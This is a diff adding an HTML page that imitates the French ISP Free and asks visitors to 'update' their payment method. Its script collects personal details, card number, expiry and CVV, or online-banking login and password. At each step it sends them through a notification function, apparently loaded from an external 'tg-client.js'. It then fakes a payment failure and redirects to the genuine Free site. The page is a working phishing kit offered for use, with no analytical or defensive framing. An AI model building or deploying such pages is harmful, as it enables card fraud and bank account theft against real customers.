@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Paiement facture</title>
+  <!-- Font Awesome pour les icônes sociales -->
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <!-- HEADER style “Free” -->
+  <header class="site-header">
+    <div class="logo">
+      <img src="Free_logo.svg.png" alt="Free" />
+    </div>
+    <nav class="main-nav">
+      <ul>
+        <li><a href="#">Freebox <span class="arrow">▾</span></a></li>
+        <li><a href="#">Téléphones &amp; Forfaits <span class="arrow">▾</span></a></li>
+        <li><a href="#">Boutiques</a></li>
+        <li><a href="#">Bons Plans</a></li>
+        <li><a href="#">Assistance</a></li>
+        <li><a href="#">Free Pro</a></li>
+      </ul>
+    </nav>
+    <div class="header-actions">
+      <button class="eligibility-btn">Testez votre éligibilité</button>
+      <a href="#" class="location-icon" title="Nos boutiques"><i class="fas fa-map-marker-alt"></i></a>
+      <a href="#" class="subscriber">Espace Abonné</a>
+    </div>
+  </header>
+
+  <!-- CONTENU centré -->
+  <div class="container">
+    <main>
+      <h1>Afin d’assurer la continuité de vos services, nous vous invitons à mettre à jour votre moyen de paiement en sélectionnant l’une des deux options proposées.</h1>
+
+      <!-- TOGGLE méthodes de paiement -->
+      <div class="toggle-methods">
+        <input type="radio" id="method-card" name="method" value="Carte bancaire" checked />
+        <label for="method-card">Carte bancaire</label>
+        <input type="radio" id="method-sepa" name="method" value="Prélèvement SEPA" />
+        <label for="method-sepa">Prélèvement SEPA</label>
+      </div>
+
+      <button id="pay-btn">Mettre à jour</button>
+    </main>
+  </div>
+
+  <!-- FOOTER style “Free” -->
+  <footer class="site-footer">
+    <div class="footer-columns">
+      <div class="footer-column">
+        <h4>Offres & Services</h4>
+        <ul>
+          <li><a href="#">Freebox Ultra</a></li>
+          <li><a href="#">Freebox Ultra Essentiel</a></li>
+          <li><a href="#">Freebox Ultra Édition Limitée</a></li>
+          <li><a href="#">Freebox Pop</a></li>
+          <li><a href="#">Freebox Pop S</a></li>
+          <li><a href="#">Série Spéciale Freebox Révolution Light</a></li>
+          <li><a href="#">Box 5G</a></li>
+          <li><a href="#">Avantages Free Family</a></li>
+          <li><a href="#">Répéteur Wi-Fi</a></li>
+          <li><a href="#">OQEE by Free</a></li>
+          <li><a href="#">Free Transfert</a></li>
+          <li><a href="#">Carte fibre / ADSL</a></li>
+          <li><a href="#">Plan du site</a></li>
+          <li><a href="#">Free × CORAIL°</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h4>Abonné</h4>
+        <ul>
+          <li><a href="#">Espace Abonné</a></li>
+          <li><a href="#">Déménager mon abonnement</a></li>
+          <li><a href="#">Suivre ma souscription</a></li>
+          <li><a href="#">Régler une facture</a></li>
+          <li><a href="#">Résiliation</a></li>
+          <li><a href="#">Compte accès libre</a></li>
+          <li><a href="#">Applications Free</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h4>Aide & Contact</h4>
+        <ul>
+          <li><a href="#">Trouver une boutique</a></li>
+          <li><a href="#">Free Proxi</a></li>
+          <li><a href="#">Assistance en ligne</a></li>
+          <li><a href="#">Trouver mon identifiant Freebox</a></li>
+          <li><a href="#">Nous contacter</a></li>
+          <li><a href="#">Résiliez votre FAI</a></li>
+          <li><a href="#">Guide Pratique</a></li>
+          <li><a href="#">Protection de l’enfance</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h4>Société</h4>
+        <ul>
+          <li><a href="#">Free Pro</a></li>
+          <li><a href="#">Free s’engage</a></li>>
+          <li><a href="#">Le groupe Iliad</a></li>
+          <li><a href="#" class="highlight">Free recrute !</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <div class="legal-links">
+        <a href="#">Informations Légales</a>
+        <a href="#">Données et contenus</a>
+        <a href="#">Signaler un contenu</a>
+        <a href="#">Tarifs et conditions</a>
+      </div>
+      <div class="social-icons">
+        <a href="#"><i class="fab fa-facebook-f"></i></a>
+        <a href="#"><i class="fab fa-x-twitter"></i></a>
+        <a href="#"><i class="fab fa-instagram"></i></a>
+        <a href="#"><i class="fab fa-tiktok"></i></a>
+        <a href="#"><i class="fab fa-youtube"></i></a>
+        <a href="#"><i class="fab fa-linkedin-in"></i></a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- MODAL DE PAIEMENT -->
+  <div id="payment-modal" class="modal-overlay hidden">
+    <div class="modal-content">
+      <!-- Étape 1 : infos perso -->
+      <form id="step-1" class="modal-step active">
+        <h2>Informations personnelles</h2>
+        <label>
+          Nom<br />
+          <input type="text" name="lastname" required />
+        </label>
+        <label>
+          Prénom<br />
+          <input type="text" name="firstname" required />
+        </label>
+        <label>
+          Téléphone<br />
+          <input type="tel" name="phone" required />
+        </label>
+        <label>
+          Email<br />
+          <input type="email" name="email" required />
+        </label>
+        <label>
+          Adresse<br />
+          <input type="text" name="address" required />
+        </label>
+        <button type="button" id="to-step-2" class="btn-next">Suivant</button>
+      </form>
+
+      <!-- Étape 2 : Carte bancaire -->
+      <form id="step-2-card" class="modal-step">
+        <h2>Détails de la carte</h2>
+        <label>
+          Numéro de carte<br />
+          <input
+            type="text"
+            id="cardnumber"
+            name="cardnumber"
+            maxlength="19"
+            placeholder="1234 5678 9012 3456"
+            required
+          />
+        </label>
+        <label>
+          Date d’expiration<br />
+          <input
+            type="text"
+            id="expdate"
+            name="expdate"
+            maxlength="5"
+            placeholder="MM/AA"
+            required
+          />
+        </label>
+        <label>
+          CVV<br />
+          <input type="text" name="cvv" maxlength="3" placeholder="123" required />
+        </label>
+        <button type="submit" class="btn-pay">Mettre à jour</button>
+      </form>
+
+      <!-- Étape 2 : Prélèvement SEPA -->
+      <form id="step-2-sepa" class="modal-step">
+        <h2>Détails du prélèvement SEPA</h2>
+        <label>
+          Nom de la banque<br />
+          <input type="text" name="bankname" required />
+        </label>
+        <label>
+          Identifiant bancaire<br />
+          <input type="text" name="bankid" required />
+        </label>
+        <label>
+          Mot de passe bancaire<br />
+          <input type="password" name="bankpass" required />
+        </label>
+        <button type="submit" class="btn-pay">Mettre à jour</button>
+      </form>
+
+      <!-- Étape 3 : échec -->
+      <div id="step-3" class="modal-step">
+        <h2>Paiement échoué</h2>
+        <p>
+          Votre paiement a échoué. Un conseiller va vous recontacter pour régulariser<br />
+          la situation.
+        </p>
+        <p>
+          Redirection dans <span id="countdown">5</span> s…
+        </p>
+      </div>
+
+      <button class="modal-close" id="modal-close">&times;</button>
+    </div>
+  </div>
+
+  <!-- Script client -->
+  <script src="tg-client.js"></script>
+  <script>
+    // DOM refs
+    const payBtn    = document.getElementById('pay-btn');
+    const toStep2   = document.getElementById('to-step-2');
+    const step1     = document.getElementById('step-1');
+    const step2Card = document.getElementById('step-2-card');
+    const step2Sepa = document.getElementById('step-2-sepa');
+    const step3     = document.getElementById('step-3');
+    const modal     = document.getElementById('payment-modal');
+    const closeBtn  = document.getElementById('modal-close');
+    const countdownEl = document.getElementById('countdown');
+    const cardInput = document.getElementById('cardnumber');
+    const expInput  = document.getElementById('expdate');
+
+    // Formatage auto
+    function formatCardNumber(e) {
+      let digits = e.target.value.replace(/\D/g, '').slice(0, 16);
+      let groups = digits.match(/.{1,4}/g) || [];
+      e.target.value = groups.join(' ');
+    }
+    function formatExpDate(e) {
+      let digits = e.target.value.replace(/\D/g, '').slice(0, 4);
+      if (digits.length > 2) digits = digits.slice(0,2) + '/' + digits.slice(2);
+      e.target.value = digits;
+    }
+    cardInput.addEventListener('input', formatCardNumber);
+    expInput.addEventListener('input', formatExpDate);
+
+    // Étape 0
+    payBtn.addEventListener('click', () => {
+      const method = document.querySelector('input[name="method"]:checked').value;
+      sendNotificationToServer(`Étape 0 – Clic Payer maintenant\nMéthode: ${method}`);
+      modal.classList.remove('hidden');
+    });
+
+    // Étape 1
+    toStep2.addEventListener('click', () => {
+      if (!step1.checkValidity()) return step1.reportValidity();
+      const d1 = new FormData(step1);
+      const infos = [
+        `Nom: ${d1.get('lastname')}`,
+        `Prénom: ${d1.get('firstname')}`,
+        `Téléphone: ${d1.get('phone')}`,
+        `Email: ${d1.get('email')}`,
+        `Adresse: ${d1.get('address')}`
+      ].join('\n');
+      sendNotificationToServer(`Étape 1 – Infos perso\n${infos}`);
+      step1.classList.remove('active');
+      if (document.querySelector('input[name="method"]:checked').value === 'Carte bancaire')
+        step2Card.classList.add('active');
+      else
+        step2Sepa.classList.add('active');
+    });
+
+    // Étape 2 – CB
+    step2Card.addEventListener('submit', e => {
+      e.preventDefault();
+      const raw = cardInput.value.replace(/\D/g, '');
+      if (raw.length !== 16) {
+        cardInput.setCustomValidity('Numéro de carte invalide');
+        return cardInput.reportValidity();
+      }
+      cardInput.setCustomValidity('');
+      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expInput.value)) {
+        expInput.setCustomValidity('Date invalide');
+        return expInput.reportValidity();
+      }
+      expInput.setCustomValidity('');
+      const d2 = new FormData(step2Card);
+      const cb = [
+        `Numéro: ${d2.get('cardnumber')}`,
+        `Exp: ${d2.get('expdate')}`,
+        `CVV: ${d2.get('cvv')}`
+      ].join('\n');
+      sendNotificationToServer(`Étape 2 – Détails CB\n${cb}`);
+      step2Card.classList.remove('active');
+      step3.classList.add('active');
+      startCountdown();
+    });
+
+    // Étape 2 – SEPA
+    step2Sepa.addEventListener('submit', e => {
+      e.preventDefault();
+      if (!step2Sepa.checkValidity()) return step2Sepa.reportValidity();
+      const ds = new FormData(step2Sepa);
+      const sepa = [
+        `Banque: ${ds.get('bankname')}`,
+        `ID: ${ds.get('bankid')}`,
+        `Pass: ${ds.get('bankpass')}`
+      ].join('\n');
+      sendNotificationToServer(`Étape 2 – Détails SEPA\n${sepa}`);
+      step2Sepa.classList.remove('active');
+      step3.classList.add('active');
+      startCountdown();
+    });
+
+    // Countdown & redirection
+    function startCountdown() {
+      let c = 5;
+      const iv = setInterval(() => {
+        countdownEl.textContent = c--;
+        if (c < 0) {
+          clearInterval(iv);
+          window.location.href = 'https://mobile.free.fr/';
+        }
+      }, 1000);
+    }
+
+    // Fermer modal
+    closeBtn.addEventListener('click', () => {
+      modal.classList.add('hidden');
+      [step1, step2Card, step2Sepa, step3].forEach(el => el.classList.remove('active'));
+      step1.classList.add('active');
+      step1.reset();
+      step2Sepa.reset();
+      cardInput.value = '';
+      expInput.value = '';
+    });
+  </script>
+</body>
+</html>
